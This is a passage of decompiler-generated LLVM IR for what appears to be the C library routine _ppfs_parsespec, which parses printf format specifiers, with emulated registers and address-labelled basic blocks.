  %v2_14338.pre-phi = sub i32 %v1_14308, ptrtoint (i32* @global_var_1d2d0.900 to i32)
  store i32 ptrtoint (i32* @global_var_1d2e8.898 to i32), i32* @r2, align 4
  %v4_1433c = sdiv i32 %v2_14338.pre-phi, 2
  %v5_1433c = add i32 %v4_1433c, ptrtoint (i32* @global_var_1d2e8.898 to i32)
  %v6_1433c = inttoptr i32 %v5_1433c to i8*
  %v7_1433c = load i8, i8* %v6_1433c, align 1
  %v9_1433c = zext i8 %v7_1433c to i32
  ret i32 %v9_1433c

; uselistorder directives
  uselistorder i32 %v1_14308, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14308, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1d2e8.898 to i32), { 1, 2, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp106 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_14350 = load i32, i32* @r4, align 4
  store i32 %v3_14350, i32* %stack_var_-32, align 4
  %v6_14350 = load i32, i32* @r5, align 4
  %v25_14350 = ptrtoint i32* %stack_var_-32 to i32
  %v1_14354 = add i32 %tmp, 16
  %v2_14354 = inttoptr i32 %v1_14354 to i32*
  %v3_14354 = load i32, i32* %v2_14354, align 4
  %v2_14358 = ptrtoint i32* %stack_var_-88 to i32
  %v1_1435c = and i32 %v3_14354, 128
  store i32 %v1_1435c, i32* @r4, align 4
  %v2_1435c = icmp eq i32 %v1_1435c, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r7.global-to-local, align 4
  %v1_1437c = add i32 %tmp, 24
  %v2_1437c = inttoptr i32 %v1_1437c to i32*
  %v3_1437c = load i32, i32* %v2_1437c, align 4
  store i32 %v3_1437c, i32* %sb.global-to-local, align 4
  br i1 %v2_1435c, label %bb, label %dec_label_pc_1439c

bb:                                               ; preds = %entry
  %v3_14380 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_143e8

dec_label_pc_1438c:                               ; preds = %dec_label_pc_1456c
  %v0_1438c = load i32, i32* %r0.global-to-local, align 4
  %v0_1459c.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14594

dec_label_pc_14394:                               ; preds = %dec_label_pc_14598
  %v1_14394 = add i32 %v0_1459c.pre, 1
  store i32 %v1_14394, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_145b4

dec_label_pc_1439c:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_143a0

dec_label_pc_143a0:                               ; preds = %dec_label_pc_143d4.dec_label_pc_143a0_crit_edge, %dec_label_pc_1439c
  %v1_143b0 = phi i32 [ %v1_143c4, %dec_label_pc_143d4.dec_label_pc_143a0_crit_edge ], [ 0, %dec_label_pc_1439c ]
  %v0_143a0 = phi i32 [ %v0_143a0.pre, %dec_label_pc_143d4.dec_label_pc_143a0_crit_edge ], [ %tmp, %dec_label_pc_1439c ]
  %v1_143a0 = inttoptr i32 %v0_143a0 to i32*
  %v2_143a0 = load i32, i32* %v1_143a0, align 4
  %v4_143a4 = mul i32 %v1_143b0, 4
  %v5_143a4 = add i32 %v2_143a0, %v4_143a4
  store i32 %v5_143a4, i32* %r3.global-to-local, align 4
  %v1_143a8 = add i32 %v5_143a4, -4
  %v2_143a8 = inttoptr i32 %v1_143a8 to i32*
  %v3_143a8 = load i32, i32* %v2_143a8, align 4
  store i32 %v3_143a8, i32* %r1.global-to-local, align 4
  store i32 %v25_14350, i32* %ip.global-to-local, align 4
  %v2_143b0 = add i32 %v1_143b0, %v25_14350
  store i32 %v2_143b0, i32* %r2.global-to-local, align 4
  %v1_143b4 = trunc i32 %v3_143a8 to i8
  %v3_143b4 = add i32 %v2_143b0, -56
  %v4_143b4 = inttoptr i32 %v3_143b4 to i8*
  store i8 %v1_143b4, i8* %v4_143b4, align 1
  %v0_143b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_143b8 = add i32 %v0_143b8, -56
  %v2_143b8 = inttoptr i32 %v1_143b8 to i8*
  %v3_143b8 = load i8, i8* %v2_143b8, align 1
  %v4_143b8 = zext i8 %v3_143b8 to i32
  store i32 %v4_143b8, i32* %r2.global-to-local, align 4
  %v0_143bc = load i32, i32* %r3.global-to-local, align 4
  %v1_143bc = add i32 %v0_143bc, -4
  %v2_143bc = inttoptr i32 %v1_143bc to i32*
  %v3_143bc = load i32, i32* %v2_143bc, align 4
  store i32 %v3_143bc, i32* %r3.global-to-local, align 4
  %v9_143c0 = icmp eq i32 %v4_143b8, %v3_143bc
  %v0_143c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_143c4 = add i32 %v0_143c4, 1
  store i32 %v1_143c4, i32* %r0.global-to-local, align 4
  br i1 %v9_143c0, label %dec_label_pc_143cc, label %dec_label_pc_147e4

dec_label_pc_143cc:                               ; preds = %dec_label_pc_143a0
  %v2_143cc = icmp eq i8 %v3_143b8, 0
  br i1 %v2_143cc, label %dec_label_pc_143dc, label %dec_label_pc_143d4

dec_label_pc_143d4:                               ; preds = %dec_label_pc_143cc
  %tmp166 = icmp ult i32 %v1_143c4, 32
  br i1 %tmp166, label %dec_label_pc_143d4.dec_label_pc_143a0_crit_edge, label %dec_label_pc_143dc

dec_label_pc_143d4.dec_label_pc_143a0_crit_edge:  ; preds = %dec_label_pc_143d4
  %v0_143a0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_143a0

dec_label_pc_143dc:                               ; preds = %dec_label_pc_143d4, %dec_label_pc_143cc
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_143e4 = ptrtoint i32* %stack_var_-87 to i32
  br label %dec_label_pc_143e8

dec_label_pc_143e8:                               ; preds = %bb, %dec_label_pc_143dc
  %storemerge102 = phi i32 [ %v2_143e4, %dec_label_pc_143dc ], [ %v3_14380, %bb ]
  store i32 %storemerge102, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_143f8

dec_label_pc_143f4:                               ; preds = %.thread22, %dec_label_pc_14504
  %v0_143f4 = phi i32 [ %v2_1457c, %.thread22 ], [ %storemerge105, %dec_label_pc_14504 ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.3, %.thread22 ], [ %stack_var_-48.2, %dec_label_pc_14504 ]
  store i32 %v0_143f4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_143f8

dec_label_pc_143f8:                               ; preds = %dec_label_pc_143e8, %dec_label_pc_143f4
  %v1_14414 = phi i32 [ %storemerge102, %dec_label_pc_143e8 ], [ %v0_143f4, %dec_label_pc_143f4 ]
  %stack_var_-48.1 = phi i32 [ %tmp106, %dec_label_pc_143e8 ], [ %stack_var_-48.0, %dec_label_pc_143f4 ]
  %v1_143f8 = inttoptr i32 %v1_14414 to i8*
  %v2_143f8 = load i8, i8* %v1_143f8, align 1
  %v3_143f8 = zext i8 %v2_143f8 to i32
  store i32 %v3_143f8, i32* %r3.global-to-local, align 4
  %v7_143fc = icmp eq i8 %v2_143f8, 42
  br i1 %v7_143fc, label %bb124, label %.thread9.thread

.thread9.thread:                                  ; preds = %dec_label_pc_143f8
  store i32 %v1_14414, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

bb124:                                            ; preds = %dec_label_pc_143f8
  %v1_14408 = load i32, i32* @lr, align 4
  %v4_14408 = mul i32 %v1_14408, -4
  %v5_14408 = add i32 %v4_14408, %v25_14350
  store i32 %v5_14408, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_14414 = add i32 %v1_14414, 1
  store i32 %v2_14414, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_1441c = add i32 %v5_14408, -12
  %v4_1441c = inttoptr i32 %v3_1441c to i32*
  store i32 0, i32* %v4_1441c, align 4
  %v0_14440.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb124, %.thread9.thread
  %v0_14440.pre = phi i32 [ %v0_14440.pre.pre, %bb124 ], [ %v1_14414, %.thread9.thread ]
  %v2_14444.pre = load i32, i32* @global_var_264e8, align 4
  br label %.backedge

dec_label_pc_14424:                               ; preds = %.backedge
  store i32 4094, i32* %r3.global-to-local, align 4
  %v0_14428 = load i32, i32* %r0.global-to-local, align 4
  %v7_1442c = icmp sgt i32 %v0_14428, 4094
  br i1 %v7_1442c, label %.thread12, label %bb126

.thread12:                                        ; preds = %dec_label_pc_14424
  %v1_1443414 = add i32 %v0_144b8, 1
  store i32 %v1_1443414, i32* %r6.global-to-local, align 4
  br label %.backedge

bb126:                                            ; preds = %dec_label_pc_14424
  %v11_14430 = mul i32 %v0_14428, 10
  %v12_14430 = add i32 %v11_14430, %v3_14440
  store i32 %v12_14430, i32* %r3.global-to-local, align 4
  %v1_14434 = add i32 %v0_144b8, 1
  store i32 %v1_14434, i32* %r6.global-to-local, align 4
  %v9_14438 = add i32 %v12_14430, -48
  store i32 %v9_14438, i32* %r0.global-to-local, align 4
  br label %.backedge

.backedge:                                        ; preds = %.thread12, %bb126, %.preheader
  %v0_144b8 = phi i32 [ %v0_14440.pre, %.preheader ], [ %v1_14434, %bb126 ], [ %v1_1443414, %.thread12 ]
  store i32 ptrtoint (i32* @global_var_264e8 to i32), i32* %r3.global-to-local, align 4
  %v1_14440 = inttoptr i32 %v0_144b8 to i8*
  %v2_14440 = load i8, i8* %v1_14440, align 1
  %v3_14440 = zext i8 %v2_14440 to i32
  store i32 %v3_14440, i32* %r2.global-to-local, align 4
  store i32 %v2_14444.pre, i32* %r3.global-to-local, align 4
  %v3_14448 = mul nuw nsw i32 %v3_14440, 2
  %v4_14448 = add i32 %v3_14448, %v2_14444.pre
  %v5_14448 = inttoptr i32 %v4_14448 to i8*
  %v6_14448 = load i8, i8* %v5_14448, align 1
  %v8_14448 = zext i8 %v6_14448 to i32
  store i32 %v8_14448, i32* %r3.global-to-local, align 4
  %v1_1444c = and i32 %v8_14448, 8
  %v2_1444c = icmp eq i32 %v1_1444c, 0
  br i1 %v2_1444c, label %dec_label_pc_14454, label %dec_label_pc_14424

dec_label_pc_14454:                               ; preds = %.backedge
  %v0_14454 = load i32, i32* %r1.global-to-local, align 4
  %v1_14454 = add i32 %v0_14454, -1
  %v2_14454 = inttoptr i32 %v1_14454 to i8*
  %v3_14454 = load i8, i8* %v2_14454, align 1
  %v4_14454 = zext i8 %v3_14454 to i32
  store i32 %v4_14454, i32* %r3.global-to-local, align 4
  %v7_14458 = icmp eq i8 %v3_14454, 37
  br i1 %v7_14458, label %dec_label_pc_14460, label %dec_label_pc_1451c

dec_label_pc_14460:                               ; preds = %dec_label_pc_14454
  %v7_14460 = icmp eq i8 %v2_14440, 36
  %. = zext i1 %v7_14460 to i32
  store i32 %., i32* %ip.global-to-local, align 4
  %v0_1446c = load i32, i32* %r0.global-to-local, align 4
  %tmp129 = icmp slt i32 %v0_1446c, 1
  br i1 %tmp129, label %bb130, label %thread-pre-split

bb130:                                            ; preds = %dec_label_pc_14460
  store i32 0, i32* %ip.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_14460, %bb130
  %v1_144c8 = phi i32 [ 0, %bb130 ], [ %., %dec_label_pc_14460 ]
  %v2_14474 = icmp eq i32 %v1_144c8, 0
  %v0_144a4 = load i32, i32* %sb.global-to-local, align 4
  br i1 %v2_14474, label %dec_label_pc_144a4, label %dec_label_pc_1447c

dec_label_pc_1447c:                               ; preds = %thread-pre-split
  %v2_144a4 = icmp eq i32 %v0_144a4, 0
  %v1_14480 = add i32 %v0_144b8, 1
  store i32 %v1_14480, i32* %r1.global-to-local, align 4
  br i1 %v2_144a4, label %dec_label_pc_147e4, label %dec_label_pc_14488

dec_label_pc_14488:                               ; preds = %dec_label_pc_1447c
  %v2_14488 = sub i32 %v0_1446c, %v0_144a4
  %v4_14488 = xor i32 %v0_144a4, %v0_1446c
  %v5_14488 = xor i32 %v2_14488, %v0_1446c
  %v6_14488 = and i32 %v5_14488, %v4_14488
  %v7_14488 = icmp slt i32 %v6_14488, 0
  %v8_14488 = icmp slt i32 %v2_14488, 0
  %v9_14488 = icmp eq i32 %v0_1446c, %v0_144a4
  %v3_1448c = xor i1 %v8_14488, %v7_14488
  %v4_1448c = or i1 %v9_14488, %v3_1448c
  br i1 %v4_1448c, label %dec_label_pc_1449c, label %bb131

bb131:                                            ; preds = %dec_label_pc_14488
  store i32 %v0_1446c, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1449c

dec_label_pc_14498:                               ; preds = %dec_label_pc_144b8, %dec_label_pc_144c0
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1449c

dec_label_pc_1449c:                               ; preds = %bb131, %dec_label_pc_14488, %dec_label_pc_14498
  %v0_1449c = phi i32 [ %v0_14454, %dec_label_pc_14498 ], [ %v1_14480, %dec_label_pc_14488 ], [ %v1_14480, %bb131 ]
  %stack_var_-48.2 = phi i32 [ %stack_var_-48.1, %dec_label_pc_14498 ], [ %v0_1446c, %dec_label_pc_14488 ], [ %v0_1446c, %bb131 ]
  br label %dec_label_pc_144d4

dec_label_pc_144a4:                               ; preds = %thread-pre-split
  %tmp132 = icmp slt i32 %v0_144a4, 1
  br i1 %tmp132, label %dec_label_pc_144b8, label %dec_label_pc_144ac

dec_label_pc_144ac:                               ; preds = %dec_label_pc_144a4
  %v7_144ac = icmp eq i8 %v2_14440, 109
  br i1 %v7_144ac, label %dec_label_pc_1451c, label %dec_label_pc_147e4

dec_label_pc_144b8:                               ; preds = %dec_label_pc_144a4
  %tmp167 = icmp ugt i32 %v0_144b8, %v0_14454
  br i1 %tmp167, label %dec_label_pc_144c0, label %dec_label_pc_14498

dec_label_pc_144c0:                               ; preds = %dec_label_pc_144b8
  %v1_144c0 = inttoptr i32 %v0_14454 to i8*
  %v2_144c0 = load i8, i8* %v1_144c0, align 1
  %v3_144c0 = zext i8 %v2_144c0 to i32
  store i32 %v3_144c0, i32* %r3.global-to-local, align 4
  %v7_144c4 = icmp eq i8 %v2_144c0, 48
  br i1 %v7_144c4, label %dec_label_pc_14498, label %bb133

bb133:                                            ; preds = %dec_label_pc_144c0
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1451c

dec_label_pc_144d4.loopexit:                      ; preds = %dec_label_pc_144dc
  %v1_144e8 = load i32, i32* @r4, align 4
  %v3_144e8 = or i32 %v1_144e8, %v0_144fc
  store i32 %v3_144e8, i32* @r4, align 4
  %v2_144ec = add i32 %storemerge105, 1
  br label %dec_label_pc_144d4

dec_label_pc_144d4:                               ; preds = %dec_label_pc_144d4.loopexit, %dec_label_pc_1449c
  %storemerge105 = phi i32 [ %v0_1449c, %dec_label_pc_1449c ], [ %v2_144ec, %dec_label_pc_144d4.loopexit ]
  store i32 %storemerge105, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1d2c8.905 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_144e0 = inttoptr i32 %storemerge105 to i8*
  br label %dec_label_pc_144dc

dec_label_pc_144dc:                               ; preds = %dec_label_pc_144f4, %dec_label_pc_144d4
  %v0_144fc = phi i32 [ %v2_144fc, %dec_label_pc_144f4 ], [ 1, %dec_label_pc_144d4 ]
  %v0_144dc = phi i32 [ %v5_144dc, %dec_label_pc_144f4 ], [ ptrtoint ([8 x i8]* @global_var_1d2c8.905 to i32), %dec_label_pc_144d4 ]
  %v1_144dc = inttoptr i32 %v0_144dc to i8*
  %v2_144dc = load i8, i8* %v1_144dc, align 1
  %v3_144dc = zext i8 %v2_144dc to i32
  store i32 %v3_144dc, i32* %r2.global-to-local, align 4
  %v5_144dc = add i32 %v0_144dc, 1
  store i32 %v5_144dc, i32* %r1.global-to-local, align 4
  %v2_144e0 = load i8, i8* %v1_144e0, align 1
  %v3_144e0 = zext i8 %v2_144e0 to i32
  store i32 %v3_144e0, i32* %r3.global-to-local, align 4
  %v9_144e4 = icmp eq i8 %v2_144e0, %v2_144dc
  br i1 %v9_144e4, label %dec_label_pc_144d4.loopexit, label %dec_label_pc_144f4

dec_label_pc_144f4:                               ; preds = %dec_label_pc_144dc
  %v1_144f4 = inttoptr i32 %v5_144dc to i8*
  %v2_144f4 = load i8, i8* %v1_144f4, align 1
  %v3_144f4 = zext i8 %v2_144f4 to i32
  store i32 %v3_144f4, i32* %r3.global-to-local, align 4
  %v2_144f8 = icmp eq i8 %v2_144f4, 0
  %v2_144fc = mul i32 %v0_144fc, 2
  store i32 %v2_144fc, i32* %r0.global-to-local, align 4
  br i1 %v2_144f8, label %dec_label_pc_14504, label %dec_label_pc_144dc

dec_label_pc_14504:                               ; preds = %dec_label_pc_144f4
  %v1_14504 = add i32 %storemerge105, -1
  %v2_14504 = inttoptr i32 %v1_14504 to i8*
  %v3_14504 = load i8, i8* %v2_14504, align 1
  %v7_14508 = icmp eq i8 %v3_14504, 37
  %v0_1450c = load i32, i32* @r4, align 4
  %v1_1450c = and i32 %v0_1450c, 10
  store i32 %v1_1450c, i32* %r3.global-to-local, align 4
  %v4_14510 = udiv i32 %v1_1450c, 2
  %v5_14510 = sub nuw nsw i32 -1, %v4_14510
  %v6_14510 = and i32 %v0_1450c, %v5_14510
  store i32 %v6_14510, i32* @r4, align 4
  br i1 %v7_14508, label %dec_label_pc_14518, label %dec_label_pc_143f4

dec_label_pc_14518:                               ; preds = %dec_label_pc_14504
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1451c

dec_label_pc_1451c:                               ; preds = %bb133, %dec_label_pc_14454, %dec_label_pc_144ac, %dec_label_pc_14518
  %v1_14560 = phi i32 [ %storemerge105, %dec_label_pc_14518 ], [ %v0_144b8, %bb133 ], [ %v0_144b8, %dec_label_pc_144ac ], [ %v0_144b8, %dec_label_pc_14454 ]
  %v0_1455c = phi i32 [ %v5_144dc, %dec_label_pc_14518 ], [ %v0_14454, %bb133 ], [ %v0_14454, %dec_label_pc_144ac ], [ %v0_14454, %dec_label_pc_14454 ]
  %stack_var_-48.3 = phi i32 [ %stack_var_-48.2, %dec_label_pc_14518 ], [ %stack_var_-48.1, %bb133 ], [ %stack_var_-48.1, %dec_label_pc_144ac ], [ %stack_var_-48.1, %dec_label_pc_14454 ]
  %v1_1451c = inttoptr i32 %v0_1455c to i8*
  %v2_1451c = load i8, i8* %v1_1451c, align 1
  %v3_1451c = zext i8 %v2_1451c to i32
  store i32 %v3_1451c, i32* %r3.global-to-local, align 4
  %v7_14520 = icmp eq i8 %v2_1451c, 42
  br i1 %v7_14520, label %dec_label_pc_14528, label %dec_label_pc_1456c

dec_label_pc_14528:                               ; preds = %dec_label_pc_1451c
  %v0_14528 = load i32, i32* %sb.global-to-local, align 4
  %v2_14528 = icmp eq i32 %v0_14528, 0
  br i1 %v2_14528, label %dec_label_pc_1455c, label %dec_label_pc_14530

dec_label_pc_14530:                               ; preds = %dec_label_pc_14528
  %v1_14530 = inttoptr i32 %v1_14560 to i8*
  %v2_14530 = load i8, i8* %v1_14530, align 1
  %v3_14530 = zext i8 %v2_14530 to i32
  store i32 %v3_14530, i32* %r3.global-to-local, align 4
  %v7_14534 = icmp eq i8 %v2_14530, 36
  br i1 %v7_14534, label %dec_label_pc_1453c, label %dec_label_pc_147e4

dec_label_pc_1453c:                               ; preds = %dec_label_pc_14530
  %v0_1453c = load i32, i32* %r0.global-to-local, align 4
  %tmp134 = icmp slt i32 %v0_1453c, 1
  br i1 %tmp134, label %dec_label_pc_147e4, label %dec_label_pc_14544

dec_label_pc_14544:                               ; preds = %dec_label_pc_1453c
  store i32 %v25_14350, i32* %r1.global-to-local, align 4
  %v0_1454c = load i32, i32* @lr, align 4
  %v3_1454c = mul i32 %v0_1454c, -4
  %v4_1454c = add i32 %v3_1454c, %v25_14350
  store i32 %v4_1454c, i32* %r3.global-to-local, align 4
  %v1_14550 = add i32 %v1_14560, 1
  store i32 %v1_14550, i32* %r6.global-to-local, align 4
  %v2_14554 = add i32 %v4_1454c, -24
  %v3_14554 = inttoptr i32 %v2_14554 to i32*
  store i32 %v0_1453c, i32* %v3_14554, align 4
  br label %dec_label_pc_14568

dec_label_pc_1455c:                               ; preds = %dec_label_pc_14528
  %v1_1455c = add i32 %v0_1455c, 1
  store i32 %v1_1455c, i32* %r3.global-to-local, align 4
  %v9_14560 = icmp eq i32 %v1_1455c, %v1_14560
  br i1 %v9_14560, label %dec_label_pc_14568, label %dec_label_pc_147e4

dec_label_pc_14568:                               ; preds = %dec_label_pc_1455c, %dec_label_pc_14544
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1456c

dec_label_pc_1456c:                               ; preds = %dec_label_pc_1451c, %dec_label_pc_14568
  %v0_1456c = load i32, i32* @lr, align 4
  %v2_1456c = icmp eq i32 %v0_1456c, 0
  br i1 %v2_1456c, label %dec_label_pc_14574, label %dec_label_pc_1438c

dec_label_pc_14574:                               ; preds = %dec_label_pc_1456c
  %v0_14574 = load i32, i32* %r6.global-to-local, align 4
  %v1_14574 = inttoptr i32 %v0_14574 to i8*
  %v2_14574 = load i8, i8* %v1_14574, align 1
  %v3_14574 = zext i8 %v2_14574 to i32
  store i32 %v3_14574, i32* %r3.global-to-local, align 4
  %v7_14578 = icmp eq i8 %v2_14574, 46
  br i1 %v7_14578, label %.thread22, label %dec_label_pc_1458c

.thread22:                                        ; preds = %dec_label_pc_14574
  %v2_1457c = add i32 %v0_14574, 1
  store i32 %v2_1457c, i32* %r6.global-to-local, align 4
  %v1_14580 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_14580, i32* %r8.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_143f4

dec_label_pc_1458c:                               ; preds = %dec_label_pc_14574
  %v0_1458c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1458c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14594

dec_label_pc_14594:                               ; preds = %dec_label_pc_1438c, %dec_label_pc_1458c
  %v0_1459c.pre = phi i32 [ %v0_14574, %dec_label_pc_1458c ], [ %v0_1459c.pre.pre, %dec_label_pc_1438c ]
  %storemerge = phi i32 [ -1, %dec_label_pc_1458c ], [ %v0_1438c, %dec_label_pc_1438c ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1d270.907 to i32), i32* %r1.global-to-local, align 4
  %v1_1459c = inttoptr i32 %v0_1459c.pre to i8*
  br label %dec_label_pc_14598

dec_label_pc_14598:                               ; preds = %dec_label_pc_145a8, %dec_label_pc_14594
  %v0_145a8 = phi i32 [ %v1_145a8, %dec_label_pc_145a8 ], [ ptrtoint ([9 x i8]* @global_var_1d270.907 to i32), %dec_label_pc_14594 ]
  %v1_14598 = inttoptr i32 %v0_145a8 to i8*
  %v2_14598 = load i8, i8* %v1_14598, align 1
  %v3_14598 = zext i8 %v2_14598 to i32
  store i32 %v3_14598, i32* %r2.global-to-local, align 4
  %v2_1459c = load i8, i8* %v1_1459c, align 1
  %v3_1459c = zext i8 %v2_1459c to i32
  store i32 %v3_1459c, i32* %r3.global-to-local, align 4
  %v9_145a0 = icmp eq i8 %v2_1459c, %v2_14598
  br i1 %v9_145a0, label %dec_label_pc_14394, label %dec_label_pc_145a8

dec_label_pc_145a8:                               ; preds = %dec_label_pc_14598
  %v1_145a8 = add i32 %v0_145a8, 1
  %v2_145a8 = inttoptr i32 %v1_145a8 to i8*
  %v3_145a8 = load i8, i8* %v2_145a8, align 1
  %v4_145a8 = zext i8 %v3_145a8 to i32
  store i32 %v4_145a8, i32* %r3.global-to-local, align 4
  store i32 %v1_145a8, i32* %r1.global-to-local, align 4
  %v2_145ac = icmp eq i8 %v3_145a8, 0
  br i1 %v2_145ac, label %dec_label_pc_145b4, label %dec_label_pc_14598

dec_label_pc_145b4:                               ; preds = %dec_label_pc_145a8, %dec_label_pc_14394
  %v1_145d4 = phi i32 [ %v1_14394, %dec_label_pc_14394 ], [ %v0_1459c.pre, %dec_label_pc_145a8 ]
  %v1_145d0 = phi i32 [ %v0_145a8, %dec_label_pc_14394 ], [ %v1_145a8, %dec_label_pc_145a8 ]
  %v2_145b8 = sub i32 %v1_145d0, ptrtoint ([9 x i8]* @global_var_1d270.907 to i32)
  store i32 %v2_145b8, i32* %r3.global-to-local, align 4
  %v8_145c0 = icmp sgt i32 %v2_145b8, 1
  br i1 %v8_145c0, label %.thread25, label %dec_label_pc_145c4

dec_label_pc_145c4:                               ; preds = %dec_label_pc_145b4
  %v1_145c4 = inttoptr i32 %v1_145d4 to i8*
  %v2_145c4 = load i8, i8* %v1_145c4, align 1
  %v3_145c4 = zext i8 %v2_145c4 to i32
  store i32 %v3_145c4, i32* %r2.global-to-local, align 4
  %v1_145c8 = inttoptr i32 %v1_145d0 to i8*
  %v2_145c8 = load i8, i8* %v1_145c8, align 1
  %v3_145c8 = zext i8 %v2_145c8 to i32
  store i32 %v3_145c8, i32* %r3.global-to-local, align 4
  %v9_145cc = icmp eq i8 %v2_145c4, %v2_145c8
  br i1 %v9_145cc, label %bb135, label %.thread25

bb135:                                            ; preds = %dec_label_pc_145c4
  %v2_145d0 = add i32 %v1_145d0, 9
  store i32 %v2_145d0, i32* %r1.global-to-local, align 4
  %v2_145d4 = add i32 %v1_145d4, 1
  store i32 %v2_145d4, i32* %r6.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_145c4, %dec_label_pc_145b4, %bb135
  %v0_145dc = phi i32 [ %v1_145d0, %dec_label_pc_145c4 ], [ %v1_145d0, %dec_label_pc_145b4 ], [ %v2_145d0, %bb135 ]
  %v0_145d8 = phi i32 [ %v1_145d4, %dec_label_pc_145c4 ], [ %v1_145d4, %dec_label_pc_145b4 ], [ %v2_145d4, %bb135 ]
  %v1_145d8 = inttoptr i32 %v0_145d8 to i8*
  %v2_145d8 = load i8, i8* %v1_145d8, align 1
  %v3_145d8 = zext i8 %v2_145d8 to i32
  store i32 %v3_145d8, i32* %r2.global-to-local, align 4
  %v1_145dc = add i32 %v0_145dc, 9
  %v2_145dc = inttoptr i32 %v1_145dc to i8*
  %v3_145dc = load i8, i8* %v2_145dc, align 1
  %v4_145dc = zext i8 %v3_145dc to i32
  store i32 %v4_145dc, i32* %r3.global-to-local, align 4
  %v2_145e0 = icmp eq i8 %v2_145d8, 0
  %v3_145e4 = mul nuw nsw i32 %v4_145dc, 256
  store i32 %v3_145e4, i32* @lr, align 4
  br i1 %v2_145e0, label %dec_label_pc_147e4, label %dec_label_pc_145ec

dec_label_pc_145ec:                               ; preds = %.thread25
  store i32 ptrtoint ([21 x i8]* @global_var_1d2b0.909 to i32), i32* %ip.global-to-local, align 4
  %v3_145f0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_145f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_145f4

dec_label_pc_145f4:                               ; preds = %dec_label_pc_14678, %dec_label_pc_145ec
  %v1_14604 = phi i32 [ %v1_14678, %dec_label_pc_14678 ], [ ptrtoint ([21 x i8]* @global_var_1d2b0.909 to i32), %dec_label_pc_145ec ]
  %v1_145f4 = inttoptr i32 %v1_14604 to i8*
  %v2_145f4 = load i8, i8* %v1_145f4, align 1
  %v3_145f4 = zext i8 %v2_145f4 to i32
  store i32 %v3_145f4, i32* %r3.global-to-local, align 4
  %v9_145f8 = icmp eq i8 %v2_145f4, %v2_145d8
  br i1 %v9_145f8, label %dec_label_pc_14600, label %dec_label_pc_14678

dec_label_pc_14600:                               ; preds = %dec_label_pc_145f4
  store i32 ptrtoint ([21 x i8]* @global_var_1d2b0.909 to i32), i32* %r3.global-to-local, align 4
  %v2_14604 = sub i32 %v1_14604, ptrtoint ([21 x i8]* @global_var_1d2b0.909 to i32)
  store i32 %v2_14604, i32* %r2.global-to-local, align 4
  %v7_1460c = icmp slt i32 %v2_14604, 18
  br i1 %v7_1460c, label %bb137, label %dec_label_pc_14610

dec_label_pc_14610:                               ; preds = %dec_label_pc_14600
  %v1_14610 = and i32 %v3_145e4, 1024
  %v2_14610 = icmp eq i32 %v1_14610, 0
  br i1 %v2_14610, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_14610
  %v2_14614 = add i32 %v2_14604, -2
  store i32 %v2_14614, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_14600, %dec_label_pc_14610, %bb136
  %v0_14618 = phi i32 [ %v2_14604, %dec_label_pc_14600 ], [ %v2_14604, %dec_label_pc_14610 ], [ %v2_14614, %bb136 ]
  %v1_14618 = load i32, i32* %r7.global-to-local, align 4
  %v2_14618 = add i32 %v1_14618, 32
  %v3_14618 = inttoptr i32 %v2_14618 to i32*
  store i32 %v0_14618, i32* %v3_14618, align 4
